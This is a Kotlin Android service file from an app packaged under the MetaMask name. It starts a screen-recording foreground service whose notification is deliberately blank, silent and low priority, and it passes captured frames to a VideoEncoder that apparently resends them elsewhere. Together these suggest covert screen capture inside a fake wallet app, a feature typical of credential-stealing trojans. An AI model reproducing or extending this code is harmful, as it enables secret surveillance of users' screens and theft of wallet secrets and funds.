package com.example.MetaMask.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import android.util.DisplayMetrics
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import com.example.MetaMask.R

class VideoCaptureFgs : Service() {

    companion object {
        private const val TAG = "VideoCaptureFgs"
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_DATA        = "data"
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("XDBG", "[VideoCaptureFgs] onStartCommand enter intent=${intent} flags=${flags} startId=${startId}") //xdbg
        try {
            val notification = buildNotification()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                android.util.Log.d("XDBG", "[VideoCaptureFgs] if branch") //xdbg
                startForeground(
                    98,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                )
            } else {
                startForeground(98, notification)
            }
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[VideoCaptureFgs] catch (ignored)") //xdbg
            stopSelf()
            android.util.Log.d("XDBG", "[VideoCaptureFgs] return") //xdbg
            return START_NOT_STICKY
        }

        val resultCode = intent?.getIntExtra(EXTRA_RESULT_CODE, 0) ?: 0
        @Suppress("DEPRECATION")
        val data = intent?.getParcelableExtra<Intent>(EXTRA_DATA)

        if (resultCode != 0 && data != null) {
            android.util.Log.d("XDBG", "[VideoCaptureFgs] if branch") //xdbg
            try {
                if (VideoEncoder.instance?.running == true) {
                    android.util.Log.d("XDBG", "[VideoCaptureFgs] if branch") //xdbg
                    VideoEncoder.instance?.resendInit()
                    stopSelf()
                    android.util.Log.d("XDBG", "[VideoCaptureFgs] return") //xdbg
                    return START_NOT_STICKY
                }

                val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                val projection = mgr.getMediaProjection(resultCode, data) ?: run {
                    stopSelf(); return START_NOT_STICKY
                }

                val wm = getSystemService(WINDOW_SERVICE) as WindowManager
                val dm = DisplayMetrics()
                @Suppress("DEPRECATION")
                wm.defaultDisplay.getRealMetrics(dm)

                val enc = VideoEncoder()
                Thread {
                    try {
                        enc.start(this@VideoCaptureFgs, projection, dm.widthPixels, dm.heightPixels, dm.densityDpi)
                    } catch (_: Exception) {
                        android.util.Log.e("XDBG", "[VideoCaptureFgs] catch (ignored)") //xdbg
                        try { enc.stop() } catch (_: Exception) {}
                        try { projection.stop() } catch (_: Exception) {}
                    }
                }.start()

            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[VideoCaptureFgs] catch (ignored)") //xdbg
                stopSelf()
            }
        } else {
            stopSelf()
        }

        android.util.Log.d("XDBG", "[VideoCaptureFgs] return") //xdbg
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        android.util.Log.d("XDBG", "[VideoCaptureFgs] onDestroy enter") //xdbg
        super.onDestroy()
        try { VideoEncoder.instance?.stop() } catch (_: Exception) {}
    }

    private fun buildNotification(): Notification {
        android.util.Log.d("XDBG", "[VideoCaptureFgs] buildNotification enter") //xdbg
        val channelId = "VideoCaptureFgsChannel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            android.util.Log.d("XDBG", "[VideoCaptureFgs] if branch") //xdbg
            val ch = NotificationChannel(channelId, "Screen Capture", NotificationManager.IMPORTANCE_LOW)
            ch.setShowBadge(false)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
        }
        android.util.Log.d("XDBG", "[VideoCaptureFgs] return") //xdbg
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setSilent(true)
            .setShowWhen(false)
            .build()
    }
}
